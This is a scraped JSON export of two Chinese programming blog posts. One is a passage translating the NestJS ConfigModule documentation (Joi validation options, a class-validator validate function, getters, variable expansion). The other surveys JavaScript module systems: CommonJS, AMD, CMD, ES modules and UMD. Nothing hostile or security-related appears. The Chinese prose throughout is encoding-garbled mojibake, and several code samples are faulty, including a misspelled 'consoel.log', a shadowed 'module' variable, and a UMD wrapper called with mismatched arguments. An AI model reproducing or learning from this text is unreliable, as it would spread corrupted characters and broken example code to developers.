å¯ä»¥é€šè¿‡forRoot()é€‰é¡¹å¯¹è±¡çš„validationOptionsé”®ä¼ é€’ä¸€ä¸ªé€‰é¡¹å¯¹è±¡æ¥æ”¹å˜è¿™äº›è¡Œä¸ºã€‚è¿™ä¸ªé€‰é¡¹å¯¹è±¡å¯ä»¥åŒ…å«JoiéªŒè¯é€‰é¡¹æä¾›çš„ä»»ä½•æ ‡å‡†éªŒè¯é€‰é¡¹å±æ€§ã€‚ä¾‹å¦‚ï¼Œè¦åè½¬ä¸Šé¢çš„ä¸¤ä¸ªè®¾ç½®ï¼Œå¯ä»¥ä¼ é€’è¿™æ ·çš„é€‰é¡¹ã€‚ 12345678910111213141516171819import * as Joi from &#x27;joi&#x27;;@Module(&#123; imports: [ ConfigModule.forRoot(&#123; validationSchema: Joi.object(&#123; NODE_ENV: Joi.string() .valid(&#x27;development&#x27;, &#x27;production&#x27;, &#x27;test&#x27;, &#x27;provision&#x27;) .default(&#x27;development&#x27;), PORT: Joi.number().default(3000), &#125;), validationOptions: &#123; allowUnknown: false, abortEarly: true, &#125;, &#125;), ],&#125;)export class AppModule &#123;&#125; @nestjsconfigåŒ…ä½¿ç”¨çš„é»˜è®¤è®¾ç½®æ˜¯: allowUnknownï¼šæ§åˆ¶æ˜¯å¦å…è®¸åœ¨ç¯å¢ƒå˜é‡ä¸­ä½¿ç”¨æœªçŸ¥é”®ã€‚é»˜è®¤ä¸ºtrueã€‚ abortEarlyï¼š å¦‚æœä¸ºtrueï¼Œåˆ™åœ¨ç¬¬ä¸€ä¸ªé”™è¯¯æ—¶åœæ­¢éªŒè¯ï¼›å¦‚æœä¸ºfalseï¼Œåˆ™è¿”å›æ‰€æœ‰é”™è¯¯ã€‚é»˜è®¤å€¼ä¸ºfalseã€‚ è¯·æ³¨æ„ï¼Œä¸€æ—¦ä½ å†³å®šä¼ é€’ä¸€ä¸ªvalidationOptionså¯¹è±¡ï¼Œä½ æ²¡æœ‰æ˜ç¡®ä¼ é€’çš„ä»»ä½•è®¾ç½®éƒ½å°†é»˜è®¤ä¸ºJoiæ ‡å‡†é»˜è®¤å€¼ï¼ˆè€Œä¸æ˜¯@nestjsconfigé»˜è®¤å€¼ï¼‰ã€‚ä¾‹å¦‚ï¼Œå¦‚æœä½ åœ¨ä½ çš„è‡ªå®šä¹‰validationOptionså¯¹è±¡ä¸­æ²¡æœ‰æŒ‡å®šallowUnknownsï¼Œå®ƒå°†æœ‰Joié»˜è®¤å€¼falseã€‚å› æ­¤ï¼Œåœ¨æ‚¨çš„è‡ªå®šä¹‰å¯¹è±¡ä¸­æŒ‡å®šè¿™ä¸¤ä¸ªè®¾ç½®å¯èƒ½æ˜¯æœ€å®‰å…¨çš„ã€‚ è‡ªå®šä¹‰æ ¡éªŒå‡½æ•°å¦å¤–ï¼Œä½ ä¹Ÿå¯ä»¥æŒ‡å®šä¸€ä¸ªåŒæ­¥çš„validateå‡½æ•°ï¼Œè¯¥å‡½æ•°æ¥æ”¶ä¸€ä¸ªåŒ…å«ç¯å¢ƒå˜é‡çš„å¯¹è±¡ï¼ˆæ¥è‡ªenvæ–‡ä»¶å’Œè¿›ç¨‹ï¼‰ï¼Œå¹¶è¿”å›ä¸€ä¸ªåŒ…å«éªŒè¯è¿‡çš„ç¯å¢ƒå˜é‡çš„å¯¹è±¡ï¼Œè¿™æ ·ä½ å°±å¯ä»¥åœ¨éœ€è¦çš„æ—¶å€™è½¬æ¢å®ƒä»¬ã€‚å¦‚æœå‡½æ•°æŠ›å‡ºä¸€ä¸ªé”™è¯¯ï¼Œå®ƒå°†é˜»æ­¢åº”ç”¨ç¨‹åºçš„å¼•å¯¼ã€‚ åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬å°†ç»§ç»­ä½¿ç”¨class-transformerå’Œclass-validatoråŒ…ã€‚é¦–å…ˆï¼Œæˆ‘ä»¬å¿…é¡»å®šä¹‰ã€‚ ä¸€ä¸ªå…·æœ‰éªŒè¯çº¦æŸçš„ç±»ï¼Œ ä¸€ä¸ªä½¿ç”¨ plainToClass å’Œ validateSync å‡½æ•°çš„éªŒè¯å‡½æ•°ã€‚ 12345678910111213141516171819202122232425262728293031import &#123; plainToClass &#125; from &#x27;class-transformer&#x27;;import &#123; IsEnum, IsNumber, validateSync &#125; from &#x27;class-validator&#x27;;enum Environment &#123; Development = &quot;development&quot;, Production = &quot;production&quot;, Test = &quot;test&quot;, Provision = &quot;provision&quot;,&#125;class EnvironmentVariables &#123; @IsEnum(Environment) NODE_ENV: Environment; @IsNumber() PORT: number;&#125;export function validate(config: Record&lt;string, unknown&gt;) &#123; const validatedConfig = plainToClass( EnvironmentVariables, config, &#123; enableImplicitConversion: true &#125;, ); const errors = validateSync(validatedConfig, &#123; skipMissingProperties: false &#125;); if (errors.length &gt; 0) &#123; throw new Error(errors.toString()); &#125; return validatedConfig;&#125; å®Œæˆè¿™äº›ä¹‹åï¼Œä½¿ç”¨validateå‡½æ•°ä½œä¸ºConfigModuleçš„é…ç½®é€‰é¡¹ï¼Œå¦‚ä¸‹æ‰€ç¤º: 12345678910import &#123; validate &#125; from &#x27;./env.validation&#x27;;@Module(&#123; imports: [ ConfigModule.forRoot(&#123; validate, &#125;), ],&#125;)export class AppModule &#123;&#125; è‡ªå®šä¹‰getterå‡½æ•°ConfigServiceå®šä¹‰äº†ä¸€ä¸ªé€šç”¨çš„get()æ–¹æ³•ï¼Œé€šè¿‡é”®æ¥æ£€ç´¢é…ç½®å€¼ã€‚æˆ‘ä»¬è¿˜å¯ä»¥æ·»åŠ getterå‡½æ•°ï¼Œä»¥å®ç°æ›´è‡ªç„¶çš„ç¼–ç é£æ ¼ã€‚ 12345678@Injectable()export class ApiConfigService &#123; constructor(private configService: ConfigService) &#123;&#125; get isAuthEnabled(): boolean &#123; return this.configService.get(&#x27;AUTH_ENABLED&#x27;) === &#x27;true&#x27;; &#125;&#125; ç°åœ¨æˆ‘ä»¬å¯ä»¥ä½¿ç”¨getterå‡½æ•°å¦‚ä¸‹: 12345678@Injectable()export class AppService &#123; constructor(apiConfigService: ApiConfigService) &#123; if (apiConfigService.isAuthEnabled) &#123; // Authentication is enabled &#125; &#125;&#125; å¯æ‰©å±•å˜é‡@nestjsconfigæ”¯æŒç¯å¢ƒå˜é‡æ‰©å±•ã€‚é€šè¿‡è¿™ç§æŠ€æœ¯ï¼Œä½ å¯ä»¥åˆ›å»ºåµŒå¥—çš„ç¯å¢ƒå˜é‡ï¼Œå…¶ä¸­ä¸€ä¸ªå˜é‡è¢«å¼•ç”¨åˆ°å¦ä¸€ä¸ªå˜é‡çš„å®šä¹‰ä¸­ã€‚æ¯”å¦‚è¯´ 12APP_URL=mywebsite.comSUPPORT_EMAIL=support@$&#123;APP_URL&#125; é€šè¿‡è¿™ç§ç»“æ„ï¼Œå˜é‡SUPPORT_EMAILè§£æä¸ºsupport@mywebsite.comã€‚è¯·æ³¨æ„ä½¿ç”¨ $&#123;...&#125; è¯­æ³•æ¥è§¦å‘è§£æ SUPPORT_EMAIL å®šä¹‰ä¸­çš„å˜é‡ APP_URL çš„å€¼ã€‚ å¯¹äºè¿™ä¸ªåŠŸèƒ½ï¼Œ@nestjsconfigåŒ…å†…éƒ¨ä½¿ç”¨dotenv-expandã€‚ ä½¿ç”¨ä¼ é€’ç»™ConfigModuleçš„forRoot()æ–¹æ³•çš„é€‰é¡¹å¯¹è±¡ä¸­çš„expandVariableså±æ€§å¯ç”¨ç¯å¢ƒå˜é‡æ‰©å±•ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚ 123456789@Module(&#123; imports: [ ConfigModule.forRoot(&#123; // ... expandVariables: true, &#125;), ],&#125;)export class AppModule &#123;&#125; åœ¨ main.ts ä¸­ä½¿ç”¨è™½ç„¶æˆ‘ä»¬çš„é…ç½®æ˜¯å­˜å‚¨åœ¨serviceä¸­çš„ï¼Œä½†å®ƒä»ç„¶å¯ä»¥åœ¨main.tsæ–‡ä»¶ä¸­ä½¿ç”¨ã€‚è¿™æ ·ï¼Œä½ å°±å¯ä»¥ç”¨å®ƒæ¥å­˜å‚¨å˜é‡ï¼Œå¦‚åº”ç”¨ç¨‹åºç«¯å£æˆ–CORS hostã€‚ è¦è®¿é—®å®ƒï¼Œä½ å¿…é¡»ä½¿ç”¨app.get()æ–¹æ³•ï¼Œç„¶åæ˜¯æœåŠ¡å¼•ç”¨ã€‚ 1const configService = app.get(ConfigService); ç„¶åï¼Œä½ å¯ä»¥åƒå¾€å¸¸ä¸€æ ·ï¼Œé€šè¿‡è°ƒç”¨é…ç½®é”®çš„getæ–¹æ³•æ¥ä½¿ç”¨å®ƒã€‚ 1const port = configService.get(&#x27;PORT&#x27;); æœ¬æ–‡åŸºæœ¬ä¸Šæ˜¯å®˜æ–‡æ–‡æ¡£ä¸­æœ‰å…³é…ç½®éƒ¨åˆ†çš„ä¸­æ–‡ç¿»è¯‘ï¼ˆhttps://docs.nestjs.com/techniques/configurationï¼‰ï¼Œæœ‰æ—¶é—´å†å†™ä¸ªå®æˆ˜æ–‡ç« ã€‚"},{"title":"Javascript æ¨¡å—ç®¡ç†","path":"/2020/08/29/d906451e51cd/","content":"CommonJSCommonJSæ˜¯Node.jså¯¹æ¨¡å—å¼€å‘çš„æ ‡å‡†è§„èŒƒã€‚ CommonJS moduleåŸºæœ¬è¦æ±‚å¦‚ä¸‹ï¼š ä¸€ä¸ªæ–‡ä»¶å°±æ˜¯ä¸€ä¸ªæ¨¡å—ï¼Œæ‹¥æœ‰å•ç‹¬çš„ä½œç”¨åŸŸ æ™®é€šæ–¹å¼å®šä¹‰çš„ å˜é‡ã€å‡½æ•°ã€å¯¹è±¡éƒ½å±äºè¯¥æ¨¡å—å†… é€šè¿‡ require æ¥åŠ è½½æ¨¡å— é€šè¿‡ exports å’Œ module.exports æ¥æš´éœ²æ¨¡å—ä¸­çš„å†…å®¹ demo1: 1234567891011121314// module.jsmodule.exports = &#123; name: &quot;zhang&quot;, getName: function() &#123; console.log(this.name); &#125;, changeName: function(n) &#123; this.name = n; &#125;&#125;;// index.jsconst module = require(&quot;./module/index&quot;);console.log(module)\t// &#123;name: &quot;zhang&quot;, getName: Æ’, changeName: Æ’&#125; &quot;commons&quot; demo2: 1234567891011121314// module1.jsconst getParam = () =&gt; &#123; console.log(a);&#125;;let a = 123;let b = 456;exports.a = a;exports.b = b;exports.getParam = getParam;// index.jsconst module1 = require(&quot;./module/index1&quot;);consoel.log(module1, &quot;commons1&quot;)\t// &#123;a: 123, b: 456, getParam: Æ’&#125; &quot;commons1&quot; demo3: 1234567891011121314151617// module2.jslet a = 123;const getSome = () =&gt; &#123; console.log(&quot;yyy&quot;);&#125;;const getA = () =&gt; &#123; console.log(a);&#125;;exports.getSome = getSome;module.exports = getA;// index.jsconst module2 = require(&quot;./module/index2&quot;);consoel.log(module2, &quot;commons2&quot;)\t// function getA() &#123;...&#125; æ€»ç»“ ï¼š é€šè¿‡è¿™æ ·çš„ä¸€ä¸ªå¯¹æ¯”çš„ä¾‹å­å°±å¯ä»¥æ¯”è¾ƒæ¸…æ™°çš„å¯¹æ¯”å‡º exports å’Œ module.exports çš„åŒºåˆ«:1ã€å½“ exports å’Œ module.exports åŒæ—¶å­˜åœ¨çš„æ—¶å€™ï¼Œmodule.exports ä¼šç›–è¿‡ exports2ã€å½“æ¨¡å—å†…éƒ¨å…¨éƒ¨æ˜¯ exports çš„æ—¶å€™ï¼Œ å°±ç­‰åŒäº module.exports3ã€æœ€å æˆ‘ä»¬å°±å¯ä»¥è®¤å®šä¸º exports å…¶å®å°±æ˜¯ module.exports çš„å­é›†ã€‚ AMDAMDå…¨ç§°ä¸ºå¼‚æ­¥æ¨¡å—å®šä¹‰, æ˜¯ä¸“é—¨ä¸ºæµè§ˆå™¨ä¸­JavaScriptç¯å¢ƒè®¾è®¡çš„è§„èŒƒã€‚ AMDè®¾è®¡å‡ºä¸€ä¸ªç®€æ´çš„å†™æ¨¡å—APIï¼š define(id?, dependencies?, factory); å…¶ä¸­ï¼š id: æ¨¡å—æ ‡è¯†ï¼Œå¯ä»¥çœç•¥ã€‚ dependencies: æ‰€ä¾èµ–çš„æ¨¡å—ï¼Œå¯ä»¥çœç•¥ã€‚ factory: æ¨¡å—çš„å®ç°ï¼Œæˆ–è€…ä¸€ä¸ªJavaScriptå¯¹è±¡ã€‚å¦‚æœä¸ºå‡½æ•°ï¼Œå®ƒåº”è¯¥åªè¢«æ‰§è¡Œä¸€æ¬¡ï¼Œå¦‚æœæ˜¯å¯¹è±¡ï¼Œæ­¤å¯¹è±¡åº”è¯¥ä¸ºæ¨¡å—çš„è¾“å‡ºå€¼ã€‚ ä½¿ç”¨RequireJSçš„requireå‡½æ•°åŠ è½½æ¨¡å—: require([dependencies], callback); dependencies: è¡¨ç¤ºæ‰€ä¾èµ–çš„æ¨¡å— callback: ä¸€ä¸ªå›è°ƒå‡½æ•°ï¼Œå½“å‰é¢æŒ‡å®šçš„æ¨¡å—éƒ½åŠ è½½æˆåŠŸåï¼Œå®ƒå°†è¢«è°ƒç”¨ã€‚åŠ è½½çš„æ¨¡å—ä¼šä»¥å‚æ•°å½¢å¼ä¼ å…¥è¯¥å‡½æ•°ï¼Œä»è€Œåœ¨å›è°ƒå‡½æ•°å†…éƒ¨å°±å¯ä»¥ä½¿ç”¨è¿™äº›æ¨¡å— base.js 123456define(function() &#123; return &#123; mix: function(source, target) &#123; &#125; &#125;;&#125;); ui.js 1234567define([&#x27;base&#x27;], function(base) &#123; return &#123; show: function() &#123; // todo with module base &#125; &#125;&#125;); page.js 123define([&#x27;data&#x27;, &#x27;ui&#x27;], function(data, ui) &#123; // init here&#125;) data.js 1234define(&#123; users: [], members: []&#125;); ä»¥ä¸ŠåŒæ—¶æ¼”ç¤ºäº†defineçš„ä¸‰ç§ç”¨æ³• å®šä¹‰æ— ä¾èµ–çš„æ¨¡å—ï¼ˆbase.jsï¼‰ å®šä¹‰æœ‰ä¾èµ–çš„æ¨¡å—ï¼ˆui.jsï¼Œpage.jsï¼‰ å®šä¹‰æ•°æ®å¯¹è±¡æ¨¡å—ï¼ˆdata.jsï¼‰ CMDAMDå¼€å§‹ä¸ºæ‘†è„±CommonJSçš„æŸç¼šï¼Œå¼€åˆ›æ€§çš„æå‡ºäº†è‡ªå·±çš„æ¨¡å—é£æ ¼ã€‚ä½†åæ¥åˆåšäº†å¦¥åï¼Œå…¼å®¹äº† CommonJS Modules&#x2F;Wrappings ã€‚æ‰€ä»¥å°±æœ‰äº†CMD, å®ƒçš„è¯­æ³•å¦‚ä¸‹: define(id?, dependencies?, factory); å› ä¸ºCMDæ¨å´‡ä¸€ä¸ªæ–‡ä»¶ä¸€ä¸ªæ¨¡å—ï¼Œæ‰€ä»¥ç»å¸¸å°±ç”¨æ–‡ä»¶åä½œä¸ºæ¨¡å—idï¼› CMDæ¨å´‡ä¾èµ–å°±è¿‘ï¼Œæ‰€ä»¥ä¸€èˆ¬ä¸åœ¨defineçš„å‚æ•°ä¸­å†™ä¾èµ–ï¼Œè€Œæ˜¯åœ¨factoryä¸­å†™ã€‚ factoryæœ‰ä¸‰ä¸ªå‚æ•°ï¼š 1function(require, exports, module)&#123;&#125; require: require æ˜¯ä¸€ä¸ªæ–¹æ³•ï¼Œæ¥å— æ¨¡å—æ ‡è¯† ä½œä¸ºå”¯ä¸€å‚æ•°ï¼Œç”¨æ¥è·å–å…¶ä»–æ¨¡å—æä¾›çš„æ¥å£ï¼› exports: exports æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œç”¨æ¥å‘å¤–æä¾›æ¨¡å—æ¥å£ï¼› module: module æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œä¸Šé¢å­˜å‚¨äº†ä¸å½“å‰æ¨¡å—ç›¸å…³è”çš„ä¸€äº›å±æ€§å’Œæ–¹æ³•ã€‚ demo: 123456define(function(require, exports, module) &#123; var base = require(&#x27;base&#x27;); exports.show = function() &#123; // todo with module base &#125;&#125;); AMDæ¨å´‡ä¾èµ–å‰ç½®ï¼Œåœ¨å®šä¹‰æ¨¡å—çš„æ—¶å€™å°±è¦å£°æ˜å…¶ä¾èµ–çš„æ¨¡å—. CMDæ¨å´‡å°±è¿‘ä¾èµ–ï¼Œåªæœ‰åœ¨ç”¨åˆ°æŸä¸ªæ¨¡å—çš„æ—¶å€™å†å»require. AMDå’ŒCMDæœ€å¤§çš„åŒºåˆ«æ˜¯å¯¹ä¾èµ–æ¨¡å—çš„æ‰§è¡Œæ—¶æœºå¤„ç†ä¸åŒï¼Œæ³¨æ„ä¸æ˜¯åŠ è½½çš„æ—¶æœºæˆ–è€…æ–¹å¼ä¸åŒå¾ˆå¤šäººè¯´requireJSæ˜¯å¼‚æ­¥åŠ è½½æ¨¡å—ï¼ŒSeaJSæ˜¯åŒæ­¥åŠ è½½æ¨¡å—ï¼Œè¿™ä¹ˆç†è§£å®é™…ä¸Šæ˜¯ä¸å‡†ç¡®çš„ï¼Œå…¶å®åŠ è½½æ¨¡å—éƒ½æ˜¯å¼‚æ­¥çš„ï¼Œåªä¸è¿‡AMDä¾èµ–å‰ç½®ï¼Œjså¯ä»¥æ–¹ä¾¿çŸ¥é“ä¾èµ–æ¨¡å—æ˜¯è°ï¼Œç«‹å³åŠ è½½ï¼Œè€ŒCMDå°±è¿‘ä¾èµ–ï¼Œéœ€è¦ä½¿ç”¨æŠŠæ¨¡å—å˜ä¸ºå­—ç¬¦ä¸²è§£æä¸€éæ‰çŸ¥é“ä¾èµ–äº†é‚£äº›æ¨¡å—ï¼Œè¿™ä¹Ÿæ˜¯å¾ˆå¤šäººè¯Ÿç—…CMDçš„ä¸€ç‚¹ï¼Œç‰ºç‰²æ€§èƒ½æ¥å¸¦æ¥å¼€å‘çš„ä¾¿åˆ©æ€§ï¼Œå®é™…ä¸Šè§£ææ¨¡å—ç”¨çš„æ—¶é—´çŸ­åˆ°å¯ä»¥å¿½ç•¥ã€‚ ES Moduleåœ¨ ES2015 æ ‡å‡†ä¸ºå‡ºæ¥ä¹‹å‰ï¼Œæœ€ä¸»è¦çš„æ˜¯CommonJSå’ŒAMDè§„èŒƒã€‚ä¸Šæ–‡ä¸­æˆ‘ä»¬å·²ç»ä»‹ç»äº† CommonJS è§„èŒƒï¼ˆä¸»è¦æ˜¯ä¸ºäº†æœåŠ¡ç«¯ NodeJS æœåŠ¡ï¼‰å’Œ AMDï¼ˆä¸»è¦å¼•ç”¨åœ¨æµè§ˆå™¨ç«¯ï¼‰ï¼Œé‚£ä¹ˆå½“ ES6æ ‡å‡†çš„å‡ºç°ï¼Œä¸ºæµè§ˆå™¨ç«¯æ¨¡å—åŒ–åšäº†ä¸€ä¸ªéå¸¸å¥½çš„è¡¥å……ã€‚ exportç”¨äºå¯¹å¤–è¾“å‡ºæœ¬æ¨¡å—ï¼ˆä¸€ä¸ªæ–‡ä»¶å¯ä»¥ç†è§£ä¸ºä¸€ä¸ªæ¨¡å—ï¼‰å˜é‡çš„æ¥å£importç”¨äºå¯¼å…¥exportå¯¼å‡ºçš„æ¨¡å— 1234567891011121314151617181920212223// index.jsexport const fn1 = function () &#123; console.log(&#x27;fn1&#x27;)&#125;export const fn2 = function () &#123; console.log(&#x27;fn2&#x27;)&#125;const fn = &#123; fn1, fn2&#125;export default fn// index1.jsimport &#123; fn1, fn2 &#125; from &#x27;index.js&#x27;fn1() // &#x27;fn1&#x27;fn2() // &#x27;fn2&#x27; import fn from &#x27;index.js&#x27;console.log(fn) // &#123;fn1: Æ’, fn2: Æ’&#125; export å¯ä»¥å¯¼å‡ºçš„æ˜¯ä¸€ä¸ªå¯¹è±¡ä¸­åŒ…å«çš„å¤šä¸ª å±æ€§ï¼Œæ–¹æ³•ã€‚ export default åªèƒ½å¯¼å‡º ä¸€ä¸ª å¯ä»¥ä¸å…·åçš„ å¯¹è±¡ã€‚ import &#123;fn&#125; from &#39;./xxx/xxx&#39; ( export å¯¼å‡ºæ–¹å¼çš„ å¼•ç”¨æ–¹å¼ ) import fn from &#39;./xxx/xxx1&#39; ( export default å¯¼å‡ºæ–¹å¼çš„ å¼•ç”¨æ–¹å¼ ) UMDAMDä»¥æµè§ˆå™¨ä¸ºç¬¬ä¸€ï¼ˆbrowser-firstï¼‰çš„åŸåˆ™å‘å±•ï¼Œé€‰æ‹©å¼‚æ­¥åŠ è½½æ¨¡å—ã€‚å®ƒçš„æ¨¡å—æ”¯æŒå¯¹è±¡ï¼ˆobjectsï¼‰ã€å‡½æ•°ï¼ˆfunctionsï¼‰ã€æ„é€ å™¨ï¼ˆconstructorsï¼‰ã€å­—ç¬¦ä¸²ï¼ˆstringsï¼‰ã€JSONç­‰å„ç§ç±»å‹çš„æ¨¡å—ã€‚å› æ­¤åœ¨æµè§ˆå™¨ä¸­å®ƒéå¸¸çµæ´»ã€‚ CommonJS moduleä»¥æœåŠ¡å™¨ç«¯ä¸ºç¬¬ä¸€ï¼ˆserver-firstï¼‰çš„åŸåˆ™å‘å±•ï¼Œé€‰æ‹©åŒæ­¥åŠ è½½æ¨¡å—ã€‚å®ƒçš„æ¨¡å—æ˜¯æ— éœ€åŒ…è£…çš„ï¼ˆunwrapped modulesï¼‰ä¸”è´´è¿‘äºES.next&#x2F;Harmonyçš„æ¨¡å—æ ¼å¼ã€‚ä½†å®ƒä»…æ”¯æŒå¯¹è±¡ç±»å‹ï¼ˆobjectsï¼‰æ¨¡å—ã€‚ è¿™è¿«ä½¿ä¸€äº›äººåˆæƒ³å‡ºå¦ä¸€ä¸ªæ›´é€šç”¨æ ¼å¼ UMD(Universal Module Definition)ã€‚å¸Œæœ›æä¾›ä¸€ä¸ªå‰åç«¯è·¨å¹³å°çš„è§£å†³æ–¹æ¡ˆã€‚ UMDçš„å®ç°å¾ˆç®€å•ï¼Œå…ˆåˆ¤æ–­æ˜¯å¦æ”¯æŒNode.jsæ¨¡å—æ ¼å¼ï¼ˆexportsæ˜¯å¦å­˜åœ¨ï¼‰ï¼Œå­˜åœ¨åˆ™ä½¿ç”¨Node.jsæ¨¡å—æ ¼å¼ã€‚ å†åˆ¤æ–­æ˜¯å¦æ”¯æŒAMDï¼ˆdefineæ˜¯å¦å­˜åœ¨ï¼‰ï¼Œå­˜åœ¨åˆ™ä½¿ç”¨AMDæ–¹å¼åŠ è½½æ¨¡å—ã€‚å‰ä¸¤ä¸ªéƒ½ä¸å­˜åœ¨ï¼Œåˆ™å°†æ¨¡å—å…¬å¼€åˆ°å…¨å±€ï¼ˆwindowæˆ–globalï¼‰ã€‚ ä¸‹é¢æ˜¯ä¸€ä¸ªç¤ºä¾‹ 1234567891011121314151617181920(function (root, factory) &#123; if(typeof exports === &#x27;object&#x27; &amp;&amp; typeof module === &#x27;object&#x27;) module.exports = factory(); else if(typeof define === &#x27;function&#x27; &amp;&amp; define.amd) define([], factory); else if(typeof exports === &#x27;object&#x27;) exports[&quot;nav&quot;] = factory(); else root[&quot;nav&quot;] = factory();&#125;)(window, this, function() &#123; // module return &#123; addEvent: function(el, type, handle) &#123; //... &#125;, removeEvent: function(el, type, handle) &#123; &#125;, &#125;;&#125;)"}]